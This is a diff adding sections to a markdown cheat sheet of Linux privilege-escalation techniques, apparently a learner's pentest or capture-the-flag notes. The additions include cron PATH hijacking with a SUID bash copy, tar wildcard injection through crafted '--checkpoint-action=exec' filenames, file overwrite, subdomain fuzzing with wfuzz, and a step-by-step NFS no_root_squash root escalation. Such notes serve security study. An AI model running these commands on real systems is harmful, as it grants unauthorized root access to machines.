@@ -38,10 +38,13 @@ SUID:
 
 Environmental variables: `env`
 Capabilities: `getcap -r / 2>/dev/null`
+Cronjobs: `cat /etc/crontab`
+Systemd timers: `systemctl list-timers --all`
 IP: 
 - `ifconfig`
 - `ip a`
 
+NFS root squashing: `cat /etc/exports`
 Network communication:
 - `route`
 - `ip route`
@@ -222,3 +225,61 @@ Similar in concept to SUIDs. Starting from kernel 2.2.
 Required to have `cap_setuid+ep` on capability in enumeration
 
 For python capability: `/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
+
+
+## Scheduled tasks
+
+Can further enumerate cronjobs, look at PayloadsAllTheThings.
+
+Can also look at systemd timers.
+
+### Escalation by cron path
+
+Check the path and place malicious code in the path, for example a shell script: 
+- `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > [PATH]/[file].sh`
+- Then run `/tmp/bash -p`
+
+### Escalation by cron wildcards
+
+Also applicable outside of cron.
+
+If there is a wildcard (*) in a script, this can be abused.
+
+Make executable malware , e.g. `[file].sh` where the wildcard is.
+
+For `tar` we need:
+- `touch [path]-checkpoint=1`
+- `touch [path]--checkpoint-action=exec=sh\ [file].sh`
+
+### Escalation by file overwrite
+
+Overwrite file with reverse shell or something like:
+- `cp /bin/bash /tmp/bash; chmod +s /tmp/bash`
+- Then run `/tmp/bash -p`
+
+### Box notes
+
+Use `wfuzz`:
+- Add host to `/etc/hosts`
+- `wfuzz -c -f sub-fighter -w /usr/share/spiderfoot/spiderfoot/dicts/subdomains-10000.txt -u http://[HOST] -H "Host: FUZZ.[HOST]" --hw [FILTER-WORD-COUNT]`
+- Add new subdomains to `/etc/hosts`
+
+
+## NFS root squashing
+
+`no_root_squash` in `/etc/exports`
+
+On host:
+- `showmount -e [ip]`
+- `mkdir /tmp/[name]`
+- `mount -o rw,vers=3 [ip]:/tmp /tmp/[name]`
+
+On target:
+- `cp /bin/bash /tmp/[name]/bash`
+
+On host:
+- `sudo chown root:root /tmp/[name]/bash`
+- `sudo chmod +xs /tmp/[name]/bash`
+
+On target:
+- `/tmp/[name]/bash -p`
